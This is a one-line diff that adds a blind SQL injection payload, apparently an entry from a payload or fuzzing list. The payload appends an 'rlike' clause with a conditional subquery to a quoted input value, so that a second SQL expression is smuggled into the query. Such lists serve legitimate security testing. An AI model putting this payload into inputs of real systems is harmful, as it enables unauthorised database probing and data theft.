@@ -1,0 +1,1 @@
+1' rlike (select (case when (5384=7060) then 1 else 0x28 end))
